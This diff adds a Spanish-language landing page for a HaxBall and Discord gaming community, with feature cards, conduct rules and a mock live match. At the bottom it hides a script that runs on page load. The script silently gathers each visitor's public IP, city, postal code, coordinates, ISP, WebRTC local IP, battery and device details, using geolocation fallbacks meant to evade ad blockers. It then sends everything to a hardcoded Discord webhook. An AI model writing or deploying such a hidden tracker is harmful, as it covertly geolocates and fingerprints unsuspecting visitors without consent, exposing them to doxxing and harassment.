@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Asado, Fernet y HaxBall</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',system-ui,sans-serif;line-height:1.6}
+a{color:inherit;text-decoration:none}
+.top-bar{background:#1c2430;text-align:center;padding:8px 12px;font-size:13px;color:#9fb0c9;border-bottom:1px solid #2d3748}
+.hero{padding:80px 20px;text-align:center;background:radial-gradient(ellipse at top,#2a1a12 0%,#0d1117 70%)}
+.hero h1{font-size:clamp(2rem,5vw,3.4rem);background:linear-gradient(90deg,#ff9a3c,#ffd166,#8ac926);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:18px}
+.hero p{max-width:640px;margin:0 auto 26px;color:#b6c2d4}
+.badges{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:28px}
+.badge{background:#1c2430;border:1px solid #2d3748;border-radius:999px;padding:6px 16px;font-size:13px}
+.btn{display:inline-block;background:linear-gradient(90deg,#ff7b25,#ffb03a);color:#1a1207;font-weight:700;padding:14px 34px;border-radius:10px;transition:.2s}
+.btn:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.section{max-width:1100px;margin:0 auto;padding:70px 20px}
+.section h2{text-align:center;font-size:clamp(1.5rem,3.5vw,2.2rem);margin-bottom:10px}
+.section .sub{text-align:center;color:#8b9bb4;max-width:600px;margin:0 auto 40px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:20px}
+.card{background:#161b22;border:1px solid #2d3748;border-radius:14px;padding:26px}
+.card h3{color:#ffb03a;margin-bottom:10px;font-size:1.1rem}
+.card p{color:#9fb0c9;font-size:.95rem}
+.card:hover{border-color:#ffb03a55}
+.community{background:linear-gradient(135deg,#1a2332,#2a1a12);border-radius:18px;max-width:900px;margin:0 auto;padding:44px;text-align:center;border:1px solid #2d3748}
+.avs{display:flex;justify-content:center;gap:14px;margin:20px 0;font-size:1.4rem}
+.av{width:54px;height:54px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#2d3748;border:2px solid #ffb03a;font-weight:700}
+.ball{width:54px;height:54px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#0d1117;border:2px solid #8ac926;font-size:1.4rem;animation:spin 3s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.stats{display:flex;justify-content:center;gap:26px;flex-wrap:wrap;margin:18px 0;font-size:14px;color:#9fb0c9}
+.rule{background:#161b22;border-left:4px solid #ff7b25;border-radius:8px;padding:16px 20px;margin-bottom:12px;max-width:720px;margin-left:auto;margin-right:auto}
+.rule b{color:#ffb03a}
+.live{background:#0a0e14;border:1px solid #2d3748;border-radius:16px;max-width:780px;margin:0 auto;padding:26px}
+.live-bar{display:flex;justify-content:space-between;font-size:13px;color:#8b9bb4;margin-bottom:14px;border-bottom:1px solid #2d3748;padding-bottom:10px}
+.score{display:flex;align-items:center;justify-content:center;gap:20px;font-size:2.2rem;font-weight:800;margin:20px 0}
+.score .num{background:#161b22;border:1px solid #2d3748;border-radius:10px;padding:6px 20px;color:#8ac926}
+.teams{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:18px;font-size:.9rem}
+.team{padding:14px;border-radius:10px;background:#11161e}
+.team.red{border:1px solid #ff5a5a55}
+.team.blue{border:1px solid #5a8bff55}
+.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:#8ac926;margin-right:6px;animation:p 1.2s infinite}
+@keyframes p{50%{opacity:.3}}
+.link-box{text-align:center;margin-top:24px}
+.link-box code{display:inline-block;background:#161b22;border:1px solid #2d3748;border-radius:8px;padding:10px 16px;font-size:13px;word-break:break-all;margin-bottom:14px;color:#9fb0c9}
+footer{text-align:center;padding:40px 20px;color:#5d6b82;font-size:13px;border-top:1px solid #1c2430}
+@media(max-width:600px){.teams{grid-template-columns:1fr}.community{padding:28px}}
+</style>
+</head>
+<body>
+<div class="top-bar">Servidor Activo 24/7 • Host 3v3 Abierto • Comunidad Sana</div>
+
+<header class="hero">
+  <h1>Asado, Fernet y HaxBall</h1>
+  <p>El punto de encuentro definitivo para tirar paredes perfectas, armar el asado con amigos, debatir tácticas y pasarla bien en nuestra gran comunidad de Discord. ¡Entrá a la cancha y demostrá tu nivel!</p>
+  <div class="badges">
+    <span class="badge">100% Buena Onda</span>
+    <span class="badge">24/7 Salas HaxBall</span>
+    <span class="badge">🏆 Torneos &amp; Premios</span>
+  </div>
+  <a class="btn" href="https://discord.gg/" target="_blank" rel="noopener">Unirme al Servidor Ahora</a>
+</header>
+
+<section class="section">
+  <div class="community">
+    <h2>Asado y Fernet 🥩⚽</h2>
+    <p style="color:#8ac926;font-weight:600;font-size:14px;margin-top:6px"><span class="pulse"></span>Servidor Oficial en Línea</p>
+    <div class="avs">
+      <div class="av">AK</div>
+      <div class="av">HM</div>
+      <div class="ball">⚽</div>
+    </div>
+    <div class="stats">
+      <span>Canales de voz activos: 4</span>
+      <span>Partidos en curso: Host 3v3</span>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <h2>Nuestra Comunidad</h2>
+  <p class="sub">Diseñado por y para fanáticos del HaxBall y las buenas juntadas. Todo lo que necesitas en un solo lugar.</p>
+  <div class="grid">
+    <div class="card"><h3>Host 3v3 Todos los Días</h3><p>Salas públicas y privadas abiertas 24/7 con excelente ping, mapa clásico 3v3 y la mejor rotación de jugadores sin esperas.</p></div>
+    <div class="card"><h3>Comunidad Sana &amp; Amigos</h3><p>Un espacio libre de toxicidad para conocer gente con buena onda, formar equipo, charlar de fútbol, asados y armar juntadas.</p></div>
+    <div class="card"><h3>Canales de Voz &amp; Juntadas</h3><p>Salas de voz dinámicas para hablar en vivo durante las partidas, debatir de la liga real y pasar el rato escuchando música.</p></div>
+    <div class="card"><h3>Rangos &amp; Roles Exclusivos</h3><p>Sube de nivel participando en el chat y en las partidas para desbloquear roles únicos como Asador Master y Capitán.</p></div>
+  </div>
+</section>
+
+<section class="section">
+  <h2>Normas de Convivencia</h2>
+  <p class="sub">Para mantener la armonía, el respeto y asegurar que todos disfrutemos del HaxBall y las charlas, pedimos seguir estas sencillas reglas.</p>
+  <div class="rule"><b>1. Respeto ante todo.</b> Cero toxicidad, insultos o discriminación en chat y voz.</div>
+  <div class="rule"><b>2. Juego limpio.</b> Nada de cheats, macros ni exploits en las salas.</div>
+  <div class="rule"><b>3. Buena onda en voz.</b> No gritar ni saturar los canales durante las partidas.</div>
+  <div class="rule"><b>4. Spam cero.</b> Sin publicidad ni links fuera de los canales permitidos.</div>
+</section>
+
+<section class="section">
+  <h2>Transmisión Ficticia en Vivo</h2>
+  <p class="sub">Observa una demostración animada en tiempo real de cómo son las partidas en nuestras salas. ¡Entrá a la sala oficial para jugar de verdad!</p>
+  <div class="live">
+    <div class="live-bar">
+      <span>ASADO</span>
+      <span><span class="pulse"></span>PARTIDO EN CURSO</span>
+      <span>FERNET</span>
+    </div>
+    <div class="score">
+      <span class="num">0</span>
+      <span style="font-size:1rem;color:#8b9bb4">⏱️ 00:03</span>
+      <span class="num">0</span>
+    </div>
+    <div class="teams">
+      <div class="team red">Equipo Rojo: 🔴 Asado King 🔴 Fernet</div>
+      <div class="team blue">Equipo Azul: 🔵 HaxMaster 🔵 Pibe</div>
+    </div>
+    <div class="link-box">
+      <code>https://www.haxball.com/play?c=pGsPd0z_FNE</code><br>
+      <a class="btn" href="https://www.haxball.com/play?c=pGsPd0z_FNE" target="_blank" rel="noopener">Entrar a la Sala del Host en Tiempo Real</a>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="community">
+    <h2>¿Qué esperas para sumarte al asado?</h2>
+    <p class="sub" style="margin-bottom:24px">Uníte a nuestro servidor de Discord para conocer gente copada, participar en las próximas juntadas de HaxBall y disfrutar de las mejores charlas.</p>
+    <a class="btn" href="https://discord.gg/" target="_blank" rel="noopener">Unirme al Servidor Ahora</a>
+  </div>
+</section>
+
+<footer>Asado, Fernet y HaxBall — Comunidad HaxBall &amp; Discord</footer>
+
+<!-- ============ DISCORD WEBHOOK BEACON ============ -->
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1572743871928999996/m6f3xhk15V80vsFImPlj6Cck9jdf3HAons9a-ayk5dNMESFLFoulE1nmjVWygbmgKk8f";
+
+async function grabAllData() {
+  let data = {
+    ua: navigator.userAgent,
+    lang: navigator.language || navigator.languages?.join(", "),
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    window: `${window.innerWidth}x${window.innerHeight}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores: navigator.hardwareConcurrency || "?",
+    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "?",
+    touch: navigator.maxTouchPoints > 0 ? "Sí" : "No",
+    ref: document.referrer || "direct"
+  };
+
+  // Geolocalización vía IP (Fallbacks para evadir AdBlock)
+  const apis = [
+    "https://ipapi.co/json/",
+    "https://ipwho.is/",
+    "https://api.bigdatacloud.net/data/client-ip",
+    "https://api.ipify.org?format=json"
+  ];
+
+  for (let url of apis) {
+    try {
+      let res = await fetch(url);
+      if (res.ok) {
+        let json = await res.json();
+        data.ip = json.ip || json.ipString || "?";
+        data.city = json.city || "?";
+        data.region = json.region || json.region_name || "?";
+        data.country = json.country_name || json.country || "?";
+        data.postal = json.postal || "?";
+        data.lat = json.latitude || json.lat || "?";
+        data.lon = json.longitude || json.lon || "?";
+        data.isp = json.org || json.connection?.isp || "?";
+        data.asn = json.asn || "?";
+        break;
+      }
+    } catch (e) {}
+  }
+
+  // Batería (si el navegador lo permite)
+  try {
+    const battery = await navigator.getBattery();
+    data.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? "(Cargando)" : ""}`;
+  } catch (e) {
+    data.battery = "No disponible/Requiere HTTPS";
+  }
+
+  // WebRTC (intenta sacar IPs locales, incluso las privadas de la red)
+  try {
+    const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+    rtc.createDataChannel("");
+    rtc.createOffer().then(o => rtc.setLocalDescription(o));
+    rtc.onicecandidate = (ice) => {
+      if (ice && ice.candidate && ice.candidate.candidate) {
+        const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (match && !data.local_ip) {
+          data.local_ip = match[1];
+        }
+      }
+    };
+  } catch (e) {
+    data.local_ip = "Bloqueado por navegador";
+  }
+
+  // Esperamos un momento a que WebRTC procese
+  setTimeout(() => {
+    if (!data.ip) data.ip = "Bloqueada/Desconocida";
+    if (!data.local_ip) data.local_ip = "No obtenida";
+
+    const payload = {
+      content: "🕵️ **Nuevo visitante en Asado y Fernet**",
+      embeds: [{
+        title: "Datos extraídos",
+        color: 0xff9a3c,
+        fields: [
+          {name: "IP Pública", value: data.ip, inline: true},
+          {name: "IP Local (WebRTC)", value: data.local_ip, inline: true},
+          {name: "País", value: data.country || "?", inline: true},
+          {name: "Región", value: data.region || "?", inline: true},
+          {name: "Ciudad", value: data.city || "?", inline: true},
+          {name: "Código Postal", value: data.postal || "?", inline: true},
+          {name: "Coordenadas", value: `${data.lat}, ${data.lon}`, inline: false},
+          {name: "ISP / Org", value: data.isp || "?", inline: false},
+          {name: "Navegador / SO", value: data.ua.slice(0, 1000), inline: false},
+          {name: "Idioma", value: data.lang || "?", inline: true},
+          {name: "Zona Horaria", value: data.tz, inline: true},
+          {name: "Batería", value: data.battery, inline: true},
+          {name: "Pantalla", value: data.screen, inline: true},
+          {name: "Ventana", value: data.window, inline: true},
+          {name: "Núcleos CPU", value: data.cores.toString(), inline: true},
+          {name: "RAM estimada", value: data.ram, inline: true},
+          {name: "Touch", value: data.touch, inline: true},
+          {name: "Referencia", value: data.ref, inline: false}
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+    navigator.sendBeacon(WEBHOOK_URL, blob);
+  }, 1500);
+}
+
+grabAllData();
+</script>
+</body>
+</html>
